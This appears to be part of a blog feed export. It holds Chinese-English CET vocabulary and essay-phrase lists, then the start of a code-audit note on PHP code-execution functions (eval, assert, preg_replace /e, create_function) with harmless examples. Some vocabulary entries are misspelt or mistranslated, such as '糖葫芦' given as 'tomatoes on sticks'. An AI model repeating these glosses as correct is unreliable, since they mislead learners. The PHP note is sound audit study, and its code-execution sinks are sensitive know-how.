class="line">　　信息高地 information highland</span><br><span class="line">　　信息检索 information retrieval</span><br><span class="line">　　电话会议 teleconference</span><br><span class="line">　　无土栽培 soilless cultivation</span><br><span class="line">　　超级杂交水稻super-hybrid rice</span><br><span class="line">　　科技发展 scientific and technological advancement</span><br><span class="line">　　重点项目key project</span><br><span class="line">　　国家重点工程 national key projects</span><br><span class="line">　　南水北调 South-to-North water diversion </span><br><span class="line">　　西电东送 West-East electricity transmission project </span><br><span class="line">　　西气东输 West-East natural gas transmission project </span><br><span class="line">　　网络造谣 fabricating online rumors </span><br><span class="line">　　恶意侵害他人名誉 maliciously harming the reputation of others</span><br><span class="line">　　停止月服务 closure/shutdown of service </span><br><span class="line">　　公司歇业 closure of business </span><br><span class="line">　　道路封闭road closure</span><br><span class="line">　　人为操作差错 man-made operational mistakes </span><br><span class="line">　　生态系统 ecosystem </span><br><span class="line">　　森林生态系统forest ecosystem </span><br><span class="line">　　海洋生态系统marine ecosystem </span><br><span class="line">　　垄断价格 to monopolize the price </span><br><span class="line">　　垄断市场 to monopolize/forestall/captive/corner the market</span><br><span class="line">　　限购私用汽车 to curb the purchase of vehicles for private use </span><br><span class="line">　　汽车限购 vehicle purchase restrictions </span><br><span class="line">　　汽车购买配额 vehicle purchase quotas </span><br><span class="line">　　车牌摇号 a lottery for license plates </span><br><span class="line">　　牌照单双号限行 odd-even license plate system </span><br><span class="line">　　黑名单制度 a blacklist system </span><br><span class="line">　　执业医师 practicing physician; licensed doctors </span><br><span class="line">　　二代身份证 2nd-generation ID cards </span><br><span class="line">　　防伪技术 anti-forgery technology </span><br><span class="line">　　非法交易 illegal transaction </span><br><span class="line">　　冒名顶替 identification fraud </span><br><span class="line">　　洗钱 money laundering </span><br><span class="line">　　挂失 to report the loss </span><br><span class="line">　　补办 to re-apply/post-register </span><br><span class="line">　　户籍 household registration </span><br><span class="line">　　居住证 residence permit </span><br><span class="line">　　山洪暴发flash floods </span><br><span class="line">　　水位 water level </span><br><span class="line">　　低洼地区 low-lying areas </span><br><span class="line">　　淹没农田 to inundate crops </span><br><span class="line">　　大桥蜂塌 bridge collapse </span><br><span class="line">　　最严重受灾地区 worst-hit/worst-stricken area</span><br><span class="line">　　直接经济损失direct economic loss </span><br><span class="line">　　应急系统 emergency response system </span><br><span class="line">　　闯红灯 running red light</span><br><span class="line">　　遮挡、污损号牌 blocking or defacing license plates </span><br><span class="line">　　扣分处罚point penalty </span><br><span class="line">　　酒驾 drunk driving </span><br><span class="line">　　终身禁驾 lifetime ban from driving</span><br></pre></td></tr></table></figure>
<h3 id="中国历史和文化"><a href="#中国历史和文化" class="headerlink" title="中国历史和文化"></a>中国历史和文化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line">　　京剧 Peking opera </span><br><span class="line">　　秦腔 Qin opera </span><br><span class="line">　　功夫Kungfo </span><br><span class="line">　　太极Tai Chi </span><br><span class="line">　　口 技 ventriloquism </span><br><span class="line">　　木偶戏puppet show </span><br><span class="line">　　皮影戏 shadowplay </span><br><span class="line">　　折子戏 opera highlights </span><br><span class="line">　　杂技 acrobatics </span><br><span class="line">　　相声 witty dialogue comedy </span><br><span class="line">　　刺绣 embroidery </span><br><span class="line">　　苏绣 Suzhou embroidery </span><br><span class="line">　　泥人 clay figure </span><br><span class="line">　　书法 calligraphy</span><br><span class="line">　　中国画 traditional Chinese painting </span><br><span class="line">　　水墨画 Chinese brush painting </span><br><span class="line">　　中国结 Chinese knot</span><br><span class="line">　　中国古代四大发明 the four great inventions of ancient China </span><br><span class="line">　　火药 gunpowder </span><br><span class="line">　　印刷术printing </span><br><span class="line">　　造纸术 paper-making </span><br><span class="line">　　指南针 the compass </span><br><span class="line">　　青铜器 bronze ware </span><br><span class="line">　　瓷器 porcelain; china</span><br><span class="line">　　唐三彩 tri-color glazed pottery of the Tang Dynasty</span><br><span class="line">　　景泰蓝cloisonne</span><br><span class="line">　　秋千swing</span><br><span class="line">　　武术 martial arts</span><br><span class="line">　　儒家思想Confucianism</span><br><span class="line">　　儒家文化 Confucian culture</span><br><span class="line">　　道教 Taoism</span><br><span class="line">　　墨家Mohism</span><br><span class="line">　　法家 Legalism</span><br><span class="line">　　佛教 Buddhism</span><br><span class="line">　　孔子 Confucius</span><br><span class="line">　　孟子 Mencius</span><br><span class="line">　　老子 Lao Tzu</span><br><span class="line">　　庄子 Chuang Tzu</span><br><span class="line">　　墨子 Mo Tzu</span><br><span class="line">　　孙子Sun Tzu</span><br><span class="line">　　象形文字 pictographic characters</span><br><span class="line">　　文房四宝（笔墨纸观）the Four Treasures of the Study (brush, ink stick, paper, and ink stone)</span><br><span class="line">　　《大学》The Great Learning</span><br><span class="line">　　《中庸》The Doctrine of the Mean</span><br><span class="line">　　《论语》The Analects of Confucius</span><br><span class="line">　　《孟子》The Mencius</span><br><span class="line">　　《孙子兵法》The Art of War</span><br><span class="line">　　《三国演义》Three Kingdoms</span><br><span class="line">　　《西游爷己》Journey to the West</span><br><span class="line">　　《红楼梦》Dream of the Red Mansions</span><br><span class="line">　　《水浒传》Heroes of the Marshes</span><br><span class="line">　　《山海经》The Classic of Mountains and Rivers</span><br><span class="line">　　《资治通鉴》History as a Mirror</span><br><span class="line">　　《春秋》The Spring and Autumn Annals</span><br><span class="line">　　《史记》Historical Records</span><br><span class="line">　　《诗经》The Book of Songs</span><br><span class="line">　　《易经》The I Ching; The Book of Changes</span><br><span class="line">　　《礼记》The Book of Rites</span><br><span class="line">　　《三字经》Three-character Scriptures</span><br><span class="line">　　八股文 eight-part essay</span><br><span class="line">　　五言绝句 five-character quatrain</span><br><span class="line">　　七言律诗 seven-character octave</span><br><span class="line">　　旗袍 cheongsam</span><br><span class="line">　　中山装 Chinese tunic suit</span><br><span class="line">　　唐装 Tang suit</span><br><span class="line">　　风水 Fengshui; geomantic omen </span><br><span class="line">　　阳历 Solar calendar </span><br><span class="line">　　阴历 Lunar calendar </span><br><span class="line">　　闰年 leap year </span><br><span class="line">　　十二生肖zodiac </span><br><span class="line">　　春节 the Spring Festival </span><br><span class="line">　　元宵节 the Lantern Festival</span><br><span class="line">　　清明节 the Tomb-sweeping Day </span><br><span class="line">　　端午节 the Dragon-boat Festival </span><br><span class="line">　　中秋节 the Mid-autumn Day </span><br><span class="line">　　重阳节 the Double-ninth Day </span><br><span class="line">　　七夕节 the Double-seventh Day </span><br><span class="line">　　春联 spring couplets </span><br><span class="line">　　庙会 temple fair </span><br><span class="line">　　爆竹 firecracker</span><br><span class="line">　　年画（traditional) New Year pictures </span><br><span class="line">　　压岁钱 New Year gift-money</span><br><span class="line">　　舞龙dragon dance</span><br><span class="line">　　元宵 sweet sticky rice dumplings </span><br><span class="line">　　花灯 festival lantern</span><br><span class="line">　　灯谜 lantern riddle</span><br><span class="line">　　舞狮 lion dance</span><br><span class="line">　　踩高跷 stilt walking</span><br><span class="line">　　赛龙舟 dragon boat race</span><br><span class="line">　　胡同hutong</span><br><span class="line">　　山东菜 Shandong cuisine </span><br><span class="line">　　川菜 Sichuan cuisine </span><br><span class="line">　　粤菜 Canton cuisine </span><br><span class="line">　　扬州菜 Yangzhou cuisine </span><br><span class="line">　　月饼 moon cake </span><br><span class="line">　　年糕 rice cake </span><br><span class="line">　　油条 deep-fried dough sticks </span><br><span class="line">　　豆浆 soybean milk </span><br><span class="line">　　馒头 steamed buns </span><br><span class="line">　　花卷 steamed twisted rolls </span><br><span class="line">　　包子 steamed stuffed buns </span><br><span class="line">　　北京烤鸭 Beijing roast duck </span><br><span class="line">　　拉面 hand-stretched noodles </span><br><span class="line">　　馄饨 wonton (dumplings in soup)</span><br><span class="line">　　豆腐 tofu? bean curd </span><br><span class="line">　　麻花 fried dough twist </span><br><span class="line">　　烧饼 clay oven rolls </span><br><span class="line">　　皮蛋 100-year egg; century egg </span><br><span class="line">　　蛋炒饭 fried rice with egg </span><br><span class="line">　　糖葫芦 tomatoes on sticks </span><br><span class="line">　　火锅hot pot</span><br><span class="line">　　长城 the Great Wall of China </span><br><span class="line">　　烽火台 beacon tower</span><br><span class="line">　　秦士台皇陵 the Mausoleum of Emperor Qinshihuang</span><br><span class="line">　　兵马俑 Terracotta Warriors and Horses</span><br><span class="line">　　大雁塔 Big Wild Goose Pagoda</span><br><span class="line">　　丝绸之路the Silk Road</span><br><span class="line">　　敦煌莫高窟Mogao Grottoes</span><br><span class="line">　　华清池 Huaqing Hot Springs</span><br><span class="line">　　五台山&quot;Wutai Mountain</span><br><span class="line">　　九华山 Jiuhua Mountain</span><br><span class="line">　　蛾眉山Mount Emei</span><br><span class="line">　　泰山 Mount Tai</span><br><span class="line">　　黄山 Mount Huangshan; the Yellow Mountain </span><br><span class="line">　　故宫 the Imperial Palace</span><br><span class="line">　　天坛 the Temple of Heaven </span><br><span class="line">　　午门 Meridian Gate</span><br><span class="line">　　大运河 Grand Canal</span><br><span class="line">　　护城河the Moat</span><br><span class="line">　　回音壁Echo Wall</span><br><span class="line">　　居庸关 Juyongguan Pass</span><br><span class="line">　　九龙壁 the Nine Dragon Wal</span><br><span class="line"></span><br><span class="line">　　黄帝陵 the Mausoleum of Emperor Huangdi</span><br><span class="line">　　十三陵 the Ming Tombs</span><br><span class="line">　　苏州园林 Suzhou gardens</span><br><span class="line">　　西湖 West Lake</span><br><span class="line">　　九寨沟 Jiuzhaigou Valley</span><br><span class="line">　　日月潭 Sun Moon Lake</span><br><span class="line">　　布达拉宫Potala Palace</span><br><span class="line">　　鼓楼 drum tower</span><br><span class="line">　　四合院 quadrangle; courtyard complex</span><br><span class="line">　　孔庙 Confucius Temple</span><br><span class="line">　　乐山大佛 Leshan Giant Buddha</span><br><span class="line">　　十八罗汉 the Eighteen Disciples of the Buddha</span><br><span class="line">　　喇嘛Lama</span><br><span class="line">　　转世灵重 reincarnated soul boy 中药 traditional Chinese medicine</span><br><span class="line">　　《黄内经》Emperor Huangdi，s Canon of Traditional Chinese Medicine </span><br><span class="line">　　《神农本草经》Shennong，s Herbal Classic </span><br><span class="line">　　《本草纲目》Compendium of Materia Medica </span><br><span class="line">　　针灸 acupuncture </span><br><span class="line">　　推拿 medical massage </span><br><span class="line">　　切脉 feeling the pulse </span><br><span class="line">　　五禽戏 five-animal exercises </span><br><span class="line">　　旧石器时代 the Paleolithic Age </span><br><span class="line">　　新石器时代 the Neolithic Age; New Stone Age </span><br><span class="line">　　母系氏族社会 matriarchal clan society </span><br><span class="line">　　封建的feudal </span><br><span class="line">　　朝代 dynasty </span><br><span class="line">　　秦朝 Qin Dynasty </span><br><span class="line">　　汉朝 Han Dynasty </span><br><span class="line">　　唐朝 Tang Dynasty </span><br><span class="line">　　宋朝 Song Dynasty </span><br><span class="line">　　元朝 Yuan Dynasty </span><br><span class="line">　　明朝 Ming Dynasty </span><br><span class="line">　　清朝 Qing Dynasty</span><br><span class="line">　　秦士台皇帝 Emperor Qinshihuang; the First Emperor of Qin</span><br><span class="line">　　皇太后 Empress Dowager</span><br><span class="line">　　汉高祖刘邦 Liu Bang, Emperor Hangaozu, founder of the Han Dynasty </span><br><span class="line">　　成吉思汗Genghis Khan </span><br><span class="line">　　春秋时期 the Spring and Autumn Period </span><br><span class="line">　　文成公主 Tang Princess Wencheng </span><br><span class="line">　　慈禧太后 Empress Dowager Ci Xi </span><br><span class="line">　　皇帝，君主 emperor; monarch </span><br><span class="line">　　诸侯vassal</span><br><span class="line">　　皇妃 imperial concubine </span><br><span class="line">　　丞相，宰相 prime minister </span><br><span class="line">　　太监 court eunuch </span><br><span class="line">　　少数民族 ethnic minority </span><br><span class="line">　　祭祀 offer sacrifices </span><br><span class="line">　　西域 the Western Regions </span><br><span class="line">　　战国 the Warring States </span><br><span class="line">　　中华文明 Chinese civilization </span><br><span class="line">　　文明的摇篮 cradle of civilization</span><br><span class="line">　　秦始皇统一中国 unification of the country by Emperor Qinshihuang </span><br><span class="line">　　鸦片战争the Opium War </span><br><span class="line">　　太平天国 the Taiping Heavenly Kingdom </span><br><span class="line">　　戌戌变法 the Reform Movement of 1898 </span><br><span class="line">　　辛亥革命 the 1911 Revolution </span><br><span class="line">　　新民主主义革命 New-democratic Revolution </span><br><span class="line">　　五四运动 the May 4th Movement of 1919 </span><br><span class="line">　　南昌起义 Nanchang Uprising </span><br><span class="line">　　918 事变 September 18th Incident </span><br><span class="line">　　长征 the Long March </span><br><span class="line">　　西安事变 Xi&quot;an Incident </span><br><span class="line">　　南京大屠杀Nanjing Massacre </span><br><span class="line">　　抗日战争 the War of Resistance Against Japan </span><br><span class="line">　　毛泽东 Mao Tse-tong </span><br><span class="line">　　孙中山 Sun Yat-sen </span><br><span class="line">　　蒋介石 Chiang Kai-shek </span><br><span class="line">　　国民党 Kuomingtang</span><br><span class="line">　　中华人民共和国 the People’s Republic of China (PRC)</span><br><span class="line">　　满族 Manchu</span><br><span class="line">　　蒙古人Mongol</span><br><span class="line">　　士大夫 scholar-officials</span><br><span class="line">　　学者 scholar</span><br><span class="line">　　诗人 poet</span><br><span class="line">　　政治家statesman</span><br><span class="line">　　社会地位social status</span><br></pre></td></tr></table></figure>
<h1 id="CET6"><a href="#CET6" class="headerlink" title="CET6"></a>CET6</h1><h2 id="Writing-1"><a href="#Writing-1" class="headerlink" title="Writing"></a>Writing</h2><h3 id="短语"><a href="#短语" class="headerlink" title="短语"></a>短语</h3><pre><code>1．随着经济的快速发展with the rapid development of economy
2．人民生活水平的显著提高/ 稳步增长　 the remarkable improvement/ steady growth of people’s living standard
3．先进的科学技术 advanced science and technology
4．面临新的机遇和挑战 be faced with new opportunities and challenges
5．人们普遍认为 It is commonly believed/ recognized that…
6．社会发展的必然结果 the inevitable result of social development
7．引起了广泛的公众关注 arouse wide public concern/ draw public attention
8．不可否认 It is undeniable that…/ There is no denying that…
9．热烈的讨论/ 争论 a heated discussion/ debate
10. 有争议性的问题 a controversial issue
11．完全不同的观点 a totally different argument
12．一些人 …而另外一些人 … Some people… while others…
13. 就我而言/ 就个人而言 As far as I am concerned, / Personally,
14．就…达到绝对的一致 reach an absolute consensus on…
15．有充分的理由支持 be supported by sound reasons
16．双方的论点 argument on both sides
17．发挥着日益重要的作用 play an increasingly important role in…
18．对…必不可少 be indispensable to …
19．正如谚语所说 As the proverb goes:
20．…也不例外 …be no exception
21．对…产生有利/不利的影响 exert positive/ negative effects on…
22．利远远大于弊 the advantages far outweigh the disadvantages.
23．导致，引起 lead to/ give rise to/ contribute to/ result in
24．复杂的社会现象 a complicated social phenomenon
25．责任感 / 成就感 sense of responsibility/ sense of achievement
26. 竞争与合作精神 sense of competition and cooperation
27. 开阔眼界 widen one’s horizon/ broaden one’s visio
28．学习知识和技能 acquire knowledge and skills
29．经济/心理负担 financial burden / psychological burden
30．考虑到诸多因素 take many factors into account/ consideration
31. 从另一个角度 from another perspective
32．做出共同努力 make joint efforts
33. 对…有益 be beneficial / conducive to…
34．为社会做贡献 make contributions to the society
35．打下坚实的基础 lay a solid foundation for…
36．综合素质 comprehensive quality
37．无可非议 blameless / beyond reproach
39．致力于/ 投身于 be committed / devoted to…
40. 应当承认 Admittedly,
41．不可推卸的义务 unshakable duty
42. 满足需求 satisfy/ meet the needs of…
43．可靠的信息源 a reliable source of information
44．宝贵的自然资源 valuable natural resources
45．因特网 the Internet （一定要由冠词，字母I 大写）
46．方便快捷 convenient and efficient
47．在人类生活的方方面面 in all aspects of human life
48．环保（的） environmental protection / environmentally friendly
49．社会进步的体现 a symbol of society progress
50．科技的飞速更新 the ever-accelerated updating of science and technology
51．对这一问题持有不同态度 hold different attitudes towards this issue
52．支持前/后种观点的人 people / those in fovor of the former/ latteropinion
53．有/ 提供如下理由/ 证据 have/ provide the following reasons/ evidence
54．在一定程度上 to some extent/ degree / in some way
55. 理论和实践相结合 integrate theory with practice
56. …必然趋势 an irresistible trend of…
57．日益激烈的社会竞争 the increasingly fierce social competition
58．眼前利益 immediate interest/ short-term interest
59．长远利益. interest in the long run
60．…有其自身的优缺点 … has its merits and demerits/ advantages and disadvantages
61．扬长避短 Exploit to the full one’s favorable conditions and avoid unfavorable ones
62．取其精髓，去其糟粕 Take the essence and discard the dregs.
63．对…有害 do harm to / be harmful to/ be detrimental to
64．交流思想/ 情感/ 信息 exchange ideas/ emotions/ information
65．跟上…的最新发展 keep pace with / catch up with/ keep abreast with the latest development of …
66．采取有效措施来… take effective measures to do sth.
67．…的健康发展 the healthy development of …
68．有利有弊 Every coin has its two sides.No garden without weeds.
69．对…观点因人而异 Views on …vary from person to person.
70．重视 attach great importance to…
71．社会地位 social status
72．把时间和精力放在…上 focus time and energy on…
73．扩大知识面 expand one’s scope of knowledge
74．身心两方面 both physically and mentally
75．有直接/间接关系 be directly / indirectly related to…
76. 提出折中提议 set forth a compromise proposal
77. 可以取代 “think”的词 believe, claim, maintain, argue, insist, hold the opinion/ belief that
78．缓解压力/ 减轻负担 relieve stress/ burden
79．优先考虑/发展… give (top) priority to sth.
80．与…比较 compared with…/ in comparison with
81. 相反 in contrast / on the contrary.
82．代替 replace/ substitute / take the place of
83．经不起推敲 cannot bear closer analysis / cannot hold water
84．提供就业机会 offer job opportunities
85. 社会进步的反映 mirror of social progress
86．毫无疑问 Undoubtedly, / There is no doubt that…
87．增进相互了解 enhance/ promote mutual understanding
88．充分利用 make full use of / take advantage of
89．承受更大的工作压力 suffer from heavier work pressure
90．保障社会的稳定和繁荣 guarantee the stability and prosperity of our society
91．更多地强调 put more emphasis on…
92．适应社会发展 adapt oneself to the development of society
93．实现梦想 realize one’s dream/ make one’s dream come true
94. 主要理由列举如下 The main reasons are listed as follows:
95. 首先 First， Firstly， In the first place, To begin with
96．其次 Second, Secondly, In the second place
97. 再次 Besides，In addition, Additionally, Moreover, Furthermore
98. 最后 Finally, Last but not the least, Above all, Lastly,
99. 总而言之 All in all, To sum up, In summary, In a word,
100．我们还有很长的路要走 We still have a long way to go
</code></pre><h2 id="Translation-1"><a href="#Translation-1" class="headerlink" title="Translation"></a>Translation</h2><center>——End——</center></the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CET </tag>
            
            <tag> Words&amp;Phrases </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP常见危险函数及特殊函数Summary]]></title>
      <url>/2017/12/12/phpfunction/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>开始涉足代码审计，将自己的一些笔记记录下来！<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">



<h2 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p><strong><em>Grammar:</em></strong>     eval(phpcode)</p>
<p>eval() 函数把字符串按照 PHP 代码来计算。</p>
<p>该字符串必须是‘合法的 PHP 代码’，且必须以‘分号’结尾。</p>
<p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$string = <span class="string">"beautiful"</span>;</span><br><span class="line">$time = <span class="string">"winter"</span>;</span><br><span class="line"></span><br><span class="line">$str = <span class="string">'This is a $string $time morning!'</span>;</span><br><span class="line"><span class="keyword">echo</span> $str. <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"\$str = \"$str\";"</span>); <span class="comment">/*一定要用\转义，不然会出现语法错误 */</span></span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/* eval 还可以实现</span></span><br><span class="line"><span class="comment">  1.运行普通字符串 eg:	eval("echo 'aaa';")</span></span><br><span class="line"><span class="comment">  2.运行带&lt;? php开头的字符串</span></span><br><span class="line"><span class="comment">  3.运行&lt;? Php开头，?&gt;结尾的字符串</span></span><br><span class="line"><span class="comment">  4，运行HTML与PHP混合的字符串</span></span><br><span class="line"><span class="comment">  5.从MySQL读取代码（字符串形式），并动态加载</span></span><br><span class="line"><span class="comment">  6.运行包含include和request的代码</span></span><br><span class="line"><span class="comment">  7.知道运行的过程是否出现异常（但无法捕捉到详细异常信息）</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>assert函数在php中用于判断一个表达式是否成立。返回bool；</p>
<p><strong><em>Grammar:</em></strong>     </p>
<p>PHP 5</p>
<figure class="highlight plain"><figcaption><span>**assert** ( [mixed $assertion [, string $description ] )</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert ( mixed $assertion [, string $description ] )</span><br></pre></td></tr></table></figure>
<p>PHP 7</p>
<figure class="highlight plain"><figcaption><span>assert ( mixed $assertion [, Throwable $exception ] )</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert ( mixed $assertion [, Throwable $exception ] )</span><br></pre></td></tr></table></figure>
<p><code>mixed</code> 说明一个参数可以接受多种不同的（但不一定是所有的）类型。</p>
<p>例如 <a href="http://php.net/manual/zh/function.gettype.php" target="_blank" rel="noopener">gettype()</a> 可以接受所有的 PHP 类型，<a href="http://php.net/manual/zh/function.str-replace.php" target="_blank" rel="noopener">str_replace()</a> 可以接受字符串和数组。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> assert(<span class="string">"is_int($s)"</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//	1 [Finished in 0.0s]</span></span><br></pre></td></tr></table></figure>
<p>从这个例子可以看到字符串参数会被执行，这跟eval()类似。不过eval($code_str)只是执行符合php编码规范的$code_str。<br>assert的用法却更详细一点。</p>
<p>assert_option()可以用来对assert()进行一些约束和控制;</p>
<blockquote>
<p>默认值</p>
<blockquote>
<p>ASSERT_ACTIVE=1 //Assert函数的开关<br>ASSERT_WARNING =1 //当表达式为false时，是否要输出警告性的错误提示,issue a PHP warning for each failed assertion<br>ASSERT_BAIL= 0 //是否要中止运行；terminate execution on failed assertions<br>ASSERT_QUIET_EVAL= 0 //是否关闭错误提示，在执行表达式时；disable error_reporting during assertion expression evaluation<br>ASSERT_CALLBACK= (NULL) // 是否启动回调函数 user function to call on failed assertions</p>
</blockquote>
</blockquote>
<h3 id="preg-replace-’-e’"><a href="#preg-replace-’-e’" class="headerlink" title="preg_replace +’/e’"></a>preg_replace +’/e’</h3><p>preg_replace — 执行一个正则表达式的搜索和替换</p>
<p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
<p>搜索<code>subject</code>中匹配<code>pattern</code>的部分（通常用正则匹配）， 以<code>replacement</code>进行替换。</p>
<p>/e 修正符使preg_replace()将replacement 参数当作php代码执行，但是php5.5.0以及后面的php7都已经不再支持了，用 <a href="http://php.net/manual/zh/function.preg-replace-callback.php" target="_blank" rel="noopener">preg_replace_callback()</a> 代替。</p>
<h3 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h3><p><strong><em>Grammar:</em></strong> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function (string $args,string $code)</span><br></pre></td></tr></table></figure>
<p>创建一个匿名函数，但不是真正的匿名函数，因为它返回值为函数名</p>
<p>$args 代表参数，多个参数用逗号分隔，</p>
<p>$code 代表函数体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">func2=create_function(&quot;$args1,$args2&quot;,&quot;return $args1+$args2&quot;);</span><br><span class="line">返回值为创建的函数名，是唯一的一个字符串</span><br><span class="line">函数调用</span><br><span class="line">func2(3,5);  //返回值为8</span><br></pre></td></tr></table></figure>
<blockquote>
